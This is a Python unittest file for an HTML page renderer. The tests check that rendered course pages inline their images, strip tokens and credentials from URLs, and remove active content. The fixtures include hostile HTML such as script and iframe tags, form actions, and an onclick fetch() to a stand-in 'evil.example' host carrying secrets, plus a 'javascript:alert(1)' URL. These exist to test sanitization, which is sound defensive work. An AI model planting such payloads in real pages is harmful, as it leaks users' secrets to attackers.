from __future__ import annotations

import sys
import unittest
from pathlib import Path


REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
SOURCE_ROOT = REPOSITORY_ROOT / "src"
sys.path.insert(0, str(SOURCE_ROOT))

from canvas_ed_mcp.renderers.html import (
    AssetDisposition,
    HtmlAssetResolution,
    image_data_uri,
    render_page_html,
    sanitize_public_url,
)


class HtmlRendererTests(unittest.TestCase):
    def test_renderer_embeds_images_removes_responsive_sources_and_sanitizes_links(self) -> None:
        body = (
            '<picture><source srcset="https://files.example.test/large.png?token=private 2x">'
            '<img src="https://files.example.test/image.png?token=secret#fragment" '
            'srcset="https://files.example.test/large.png?token=private 2x" alt="Diagram"></picture>'
            '<a href="https://user:password@files.example.test/notes.pdf?signature=secret#private">PDF</a>'
            '<video src="https://media.example.test/lecture.mp4?token=secret"></video>'
        )
        image_reference = "https://files.example.test/image.png?token=secret#fragment"
        rendered = render_page_html(
            title='Week 1 <Overview>',
            public_source_url="https://canvas.example.test/pages/1?token=secret#private",
            body_html=body,
            assets=(
                HtmlAssetResolution(
                    original_reference=image_reference,
                    disposition=AssetDisposition.INLINE_IMAGE,
                    content=b"PNG",
                    media_type="image/png",
                ),
            ),
        )

        self.assertIn("data:image/png;base64,UE5H", rendered.document)
        self.assertNotIn("srcset", rendered.document.casefold())
        self.assertNotIn("<source", rendered.document.casefold())
        self.assertIn("https://files.example.test/notes.pdf", rendered.document)
        self.assertIn("https://media.example.test/lecture.mp4", rendered.document)
        self.assertIn("https://canvas.example.test/pages/1", rendered.document)
        for secret in ("token=", "signature=", "password", "#private", "#fragment"):
            self.assertNotIn(secret, rendered.document)
        self.assertIn("Week 1 &lt;Overview&gt;", rendered.document)
        self.assertFalse(rendered.retry_required)
        self.assertEqual((), rendered.issue_codes)

    def test_missing_and_non_image_assets_become_self_contained_placeholders(self) -> None:
        missing = "https://files.example.test/missing.png?token=secret"
        attachment = "https://files.example.test/attachment.pdf?signature=secret"
        rendered = render_page_html(
            title="Synthetic",
            public_source_url="https://canvas.example.test/page",
            body_html=(
                f'<img src="{missing}" alt="Missing &amp; private">'
                f'<img src="{attachment}" alt="Attachment">'
            ),
            assets=(
                HtmlAssetResolution(
                    original_reference=missing,
                    disposition=AssetDisposition.MISSING_IMAGE,
                    retry_required=True,
                    issue_code="image_timeout",
                ),
                HtmlAssetResolution(
                    original_reference=attachment,
                    disposition=AssetDisposition.SAFE_LINK,
                    public_url=attachment,
                    issue_code="not_an_image",
                ),
            ),
        )

        self.assertEqual(2, rendered.document.count("data:image/svg+xml;base64,"))
        self.assertNotIn("token=", rendered.document)
        self.assertNotIn("signature=", rendered.document)
        self.assertTrue(rendered.retry_required)
        self.assertEqual(("image_timeout", "not_an_image"), rendered.issue_codes)

    def test_unresolved_remote_image_never_survives_as_a_network_reference(self) -> None:
        url = "https://files.example.test/unresolved.png?token=secret"
        first = render_page_html(
            title="Deterministic",
            public_source_url="/courses/1/pages/2?token=secret",
            body_html=f'<img src="{url}" alt="Unresolved">',
        )
        second = render_page_html(
            title="Deterministic",
            public_source_url="/courses/1/pages/2?token=secret",
            body_html=f'<img src="{url}" alt="Unresolved">',
        )

        self.assertEqual(first, second)
        self.assertNotIn(url, first.document)
        self.assertIn("data:image/svg+xml;base64,", first.document)
        self.assertEqual(("unresolved_image",), first.issue_codes)

    def test_active_content_and_unhandled_url_surfaces_are_removed(self) -> None:
        body = (
            '<iframe src="https://evil.example/frame?token=iframe-secret"></iframe>'
            '<script src="https://evil.example/app.js?token=script-secret"></script>'
            '<form action="https://evil.example/post?signature=form-secret"><button '
            'formaction="https://evil.example/button?token=button-secret">Keep text</button></form>'
            '<div style="background:url(https://evil.example/bg?token=css-secret)" '
            'onclick="fetch(\'https://evil.example/click?token=event-secret\')" '
            'data-url="https://evil.example/data?token=data-secret" '
            'data-original="https://evil.example/original?signature=original-secret">Safe text</div>'
            '<!-- https://evil.example/comment?token=comment-secret -->'
            '<video poster="https://evil.example/poster.png?token=poster-secret"></video>'
            '<img src="https://files.example.test/photo.png" '
            'data-src="https://evil.example/lazy?token=lazy-secret" alt="Photo">'
        )
        rendered = render_page_html(
            title="Conservative",
            public_source_url="https://canvas.example.test/page",
            body_html=body,
            assets=(
                HtmlAssetResolution(
                    original_reference="https://files.example.test/photo.png",
                    disposition=AssetDisposition.INLINE_IMAGE,
                    content=b"PNG",
                    media_type="image/png",
                ),
            ),
        )

        for forbidden in (
            "iframe-secret",
            "script-secret",
            "form-secret",
            "button-secret",
            "css-secret",
            "event-secret",
            "lazy-secret",
            "data-secret",
            "original-secret",
            "comment-secret",
            "poster-secret",
            "evil.example/poster.png",
            "<iframe",
            "<script",
            "<form",
            "style=",
            "onclick=",
            "data-src=",
            "data-url=",
            "data-original=",
            "formaction=",
        ):
            self.assertNotIn(forbidden, rendered.document.casefold())
        self.assertIn("Keep text", rendered.document)
        self.assertIn("Safe text", rendered.document)
        self.assertIn("data:image/png;base64,UE5H", rendered.document)

    def test_asset_models_and_public_urls_fail_closed(self) -> None:
        with self.assertRaises(ValueError):
            image_data_uri(b"PDF", "application/pdf")
        with self.assertRaises(ValueError):
            HtmlAssetResolution(
                original_reference="https://example.test/file.pdf",
                disposition=AssetDisposition.INLINE_IMAGE,
                content=b"PDF",
                media_type="application/pdf",
            )
        with self.assertRaises(ValueError):
            sanitize_public_url("javascript:alert(1)")
        self.assertEqual(
            "https://example.test/path",
            sanitize_public_url("https://user:pass@example.test/path?token=secret#private"),
        )


if __name__ == "__main__":
    unittest.main()
